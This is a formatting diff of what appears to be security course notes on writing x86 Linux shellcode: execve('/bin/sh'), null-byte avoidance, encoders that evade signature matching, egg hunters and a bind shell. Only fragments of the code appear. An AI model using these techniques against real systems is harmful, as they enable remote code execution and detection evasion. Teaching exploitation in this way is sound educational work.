@@ -6,7 +6,7 @@ open a shell or do some other action; (2) it does not contain null
 bytes; and (3), it is small. So far, the shell code we've developed is
 37 bytes. Let's review that piece of shell code now:
 
-``` {.asm}
+``` asm
 ;;long_shell.asm
 SECTION .text           ; Code section
             global _start   ; Make label available to linker
@@ -99,7 +99,7 @@ Let's try the strategy where we push all the bytes of the "/bin/sh" onto
 the stack, one-by-one, and then the stack pointer will be the address of
 the start of the string. Something like this:
 
-``` {.asm}
+``` asm
 ;;; push_shell_1.asm
 SECTION .text           ; Code section
              global _start  ; Make label available to linker
@@ -274,7 +274,7 @@ the same as "/bin/sh".
 
 With that, we have the following shell code:
 
-``` {.asm}
+``` asm
 SECTION .text           ; Code section
              global _start  ; Make label available to linker
 _start:
@@ -304,7 +304,7 @@ _start:
 Looking closely at the two push commands, we have to be mindful of the
 order and little-endian.
 
-``` {.asm}
+``` asm
     push 0x68732f6e     ;n/sh
     push 0x69622f2f     ;//bi 
 ```
@@ -360,7 +360,7 @@ The second item we want to focus on is the `execve()` call itself. It
 turns out that you don't need to do quite as much work for the shell to
 execute. Consider this small example program:
 
-``` {.c}
+``` c
 /*small_execve.c*/
 
 #include <unistd.h>
@@ -392,7 +392,7 @@ Yes, the compiler complains, but who cares if it works.
 
 With these changes, we are left with the following shell code:
 
-``` {.asm}
+``` asm
 ;;smaller_shell.asm
 SECTION .text           ; Code section
              global _start  ; Make label available to linker
@@ -453,7 +453,7 @@ two zero'ing, saving us two bytes overall.
 
 Here's the resulting shell code:
 
-``` {.asm}
+``` asm
 ;; smallest_shell.asm
 SECTION .text           ; Code section
              global _start  ; Make label available to linker
@@ -472,7 +472,7 @@ _start:
 
 If you look at the two instructions at the top:
 
-``` {.asm}
+``` asm
     xor ecx,ecx
     mul ecx 
 ```
@@ -509,7 +509,7 @@ intrusion detection systems may scan the contents of program for
 "/bin/sh" or even "sh" to try and stop shell code. Here's a really
 simple example code:
 
-``` {.c}
+``` c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -554,7 +554,7 @@ of input type to match shell code. This is called *signature matching*
 and it is a common defense to prevent exploits. Here's a more complex
 signature matching scheme:
 
-``` {.c}
+``` c
 user@si485H-base:demo$ cat execve_sigmatcher.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -681,7 +681,7 @@ user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py 
 
 And, then we can dump this into some shell code:
 
-``` {.asm}
+``` asm
 ;;;push_shell.asm
 section .text
     global _start
@@ -738,7 +738,7 @@ That looks good. Now, all we need to do is write a decoder in assembly
 that will step through and invert all the bytes on the stack before
 calling `esp`.
 
-``` {.asm}
+``` asm
 SECTION .text
     global _start
 
@@ -831,7 +831,7 @@ that execution.
 The other important part of an egg, is that it must apear twice. For
 example, here is are huntable shell code:
 
-``` {.asm}
+``` asm
 ;;; huntable_shell.asm
 SECTION .text           ; Code section
              global _start  ; Make label available to linker
@@ -903,7 +903,7 @@ BUT, it will not segfault! So we can use `access()` to hunt out
 accessible address spaces. Here's some C code that does that, and once
 it finds the egg, it executes it.
 
-``` {.c}
+``` c
 //dummy_hunt.c
 #include <stdio.h>
 #include <unistd.h>
@@ -970,7 +970,7 @@ That long. Which is pretty fast, but not soo fast.
 Ok, now that we have a sense of how to hunt an egg, let's translate that
 logic into assembly and write an egg hunt shell code:
 
-``` {.asm}
+``` asm
 SECTION .text
     global _start
 
@@ -1117,7 +1117,7 @@ First, a socket in C is just like any other file descriptor --- it has
 an assigned number reference for the file descriptor table. To open a
 new socket, we use the socket system call:
 
-``` {.c}
+``` c
 int socket(int domain, int type, int protocol);
 ```
 
@@ -1142,7 +1142,7 @@ socket to an address.
 
 When we put this all together, the code to open a socket is:
 
-``` {.c}
+``` c
 //open new socket for server
 server = socket(AF_INET, SOCK_STREAM, 0);
 ```
@@ -1155,7 +1155,7 @@ because some machines have multiple IP addresses, also called
 multi-homed, and the OS must know which interface the socket is to be
 associated with. The function definition is as follows:
 
-``` {.c}
+``` c
  int bind(int sockfd, const struct sockaddr *addr,
                 socklen_t addrlen);
 ```
@@ -1172,7 +1172,7 @@ passed to the `bind()` (and the `accept()`) function.
 For `AF_INET` sockets, the relevant socket address is a `sockaddr_in`.
 Which has the following members:
 
-``` {.c}
+``` c
 struct sockaddr_in {
     short            sin_family;   // e.g. AF_INET, AF_INET6
     unsigned short   sin_port;     // e.g. htons(3490)
@@ -1191,7 +1191,7 @@ is 16 bytes.
 
 Initializing the server address and then binding to it looks like such:
 
-``` {.c}
+``` c
  struct sockaddr_in host_addr;
 
  //set up server address
@@ -1222,7 +1222,7 @@ The `listen()` system call establishes that the socket is to be used for
 incoming connections, i.e., as a server socket. `listen()` takes two
 arguments:
 
-``` {.c}
+``` c
 int listen(int sockfd, int backlog);
 ```
 
@@ -1241,7 +1241,7 @@ the connection. The backlog argument says how many such connections to
 the server socket can exist during that small window. A typical value
 for backlog is 4.
 
-``` {.c}
+``` c
 //set up listening queue
 listen(server,4);
 ```
@@ -1252,7 +1252,7 @@ The last piece of the puzzle is accepting an incoming connection from
 the server socket to establish a new socket where you can communicate
 with the client. The arguments for `accept()` are:
 
-``` {.c}
+``` c
  int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 ```
 
@@ -1262,7 +1262,7 @@ remote address of the client. The third argument is a reference to a
 size argument, which will store the size of the resulting argument. In
 practice, this code will look like:
 
-``` {.c}
+``` c
 int server;
 struct sockaddr_in client_addr;
 
@@ -1310,7 +1310,7 @@ start executing `/bin/sh`, but we need `/bin/sh` to have the standard
 file descriptors hooked up to the socket. The solution to that, is the
 `dup2()` system call.
 
-``` {.c}
+``` c
   //duplicate file descriptors for socket
   dup2(client, 0);
   dup2(client, 1);
@@ -1329,7 +1329,7 @@ execute the shell which will inherent the file descriptor table, and
 thus now the shell is using the socket for all communication with the
 user. To connect the circuit, on a remote host, we connect to the serve.
 
-``` {.c}
+``` c
 //rsh.c
 #include <unistd.h>
 #include <string.h>
@@ -1490,7 +1490,7 @@ The arguments is a array of the arguments that that socket function
 takes. Putting this together, we can convert our call to `socket()` to a
 `socketcall()` like so:
 
-``` {.c}
+``` c
 
   #include <unistd.h>
   #include <stdio.h>
@@ -1527,7 +1527,7 @@ make: *** [socketcall-example] Error 1
 The `socketcall()` system call is not actually defined as an entry point
 in libc. We have to write our own entry point using `syscall`:
 
-``` {.c}
+``` c
 #include <sys/syscall.h>
 
 int socketcall(int call, long * args){
@@ -1540,7 +1540,7 @@ int socketcall(int call, long * args){
 Add that to the code, we can now compile, and convert the rest of our
 remote shell to `socketcalls()`
 
-``` {.c}
+``` c
 //socketcall-rsh.c
 #include <unistd.h>
 #include <stdio.h>
@@ -1630,7 +1630,7 @@ Let's step through each of the parts:
 The first task is to call `socket()` using `socketcall()` in assembly.
 Here's the code in C.
 
-``` {.c}
+``` c
   //socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
   int socket_args[] = {AF_INET,SOCK_STREAM,0};
   server = socketcall(SYS_SOCKET, (long *) socket_args);
@@ -1639,7 +1639,7 @@ Here's the code in C.
 The values of `socket_args[]` is (2,1,0), which we can see in this
 simple program.
 
-``` {.c}
+``` c
 #include <unistd.h>
 #include <stdio.h>
 #include <string.h>
@@ -1669,7 +1669,7 @@ IPPROTO_IP:0
 We also know that SYS~SOCKET~ is value 1, so we can follow the assembly
 code:
 
-``` {.asm}
+``` asm
 
         ;; opening the socket                                                           
         xor eax,eax
@@ -1702,7 +1702,7 @@ Segmentation fault (core dumped)
 
 In c, we have:
 
-``` {.c}
+``` c
 //set up server address
   memset(&host_addr, '\0', sizeof(struct sockaddr_in));
   host_addr.sin_family=AF_INET;
@@ -1718,7 +1718,7 @@ We know the value of SYS~BIND~, that's 2, but we need to think more
 about the `host_addr` portion of the address space. Fortunately, we can
 recall the structure from last lesson:
 
-``` {.c}
+``` c
 struct sockaddr_in {
     short            sin_family;   // e.g. AF_INET, AF_INET6
     unsigned short   sin_port;     // e.g. htons(3490)
@@ -1734,7 +1734,7 @@ padding.
 So another way to think about this is that the `struct sockaddr_in` is
 the same as an array of four shorts:
 
-``` {.c}
+``` c
 short host_addr[] = {0x0002,0x697a,0x00000,0x0000};
 ```
 
@@ -1743,7 +1743,7 @@ careful about that with networking.
 
 We can write code to produce the `host_addr` like so:
 
-``` {.asm}
+``` asm
 
     xor eax,eax
     push eax        ;0,0
@@ -1759,7 +1759,7 @@ tool.
 
 Now we can setup the rest of the code like so:
 
-``` {.asm}
+``` asm
     xor eax,eax
     push eax        ;0,0
     push WORD 0x697a    ;htonos(31337)
@@ -1796,7 +1796,7 @@ Segmentation fault (core dumped)
 
 The next socketcall() is perhaps the easiest: `listen()`.
 
-``` {.c}
+``` c
 //set up listening queue
   int listen_args[] = {server, 4};
   socketcall(SYS_LISTEN, (long *) listen_args);
@@ -1805,7 +1805,7 @@ The next socketcall() is perhaps the easiest: `listen()`.
 There is only one argument to deal with, and we can quickly do the
 conversion like so.
 
-``` {.asm}
+``` asm
 tart:
     xor ecx,ecx
     mov cl,0x5
@@ -1837,7 +1837,7 @@ Segmentation fault (core dumped)
 
 Turns out, that accept is also pretty easy. In C, we have this:
 
-``` {.c}
+``` c
 sin_size = sizeof(struct sockaddr_in);
 
   //accept incoming connection
@@ -1850,7 +1850,7 @@ to NULL (or 0), which means that the next argument, the size, is also 0.
 That means our socket argument is: `{ socketfd, 0, 0}`. In assembly, we
 get the following:
 
-``` {.asm}
+``` asm
 section .text
     global _start
 
@@ -1885,7 +1885,7 @@ been doing so far. The system call number for dup2() is 0x3f. That
 leaves us with the following code assembly for dup2() if we assume `esi`
 stores our sockfd:
 
-``` {.asm}
+``` asm
 
           mov ebx,esi             ;sockfd
           xor ecx,ecx             ;stdin 0
@@ -1913,7 +1913,7 @@ Putting it all together
 Now that we have all the parts, we can look at the entire assembly that
 actually goes ahead and executes a remote shell:
 
-``` {.asm}
+``` asm
 section .text
     global _start
 
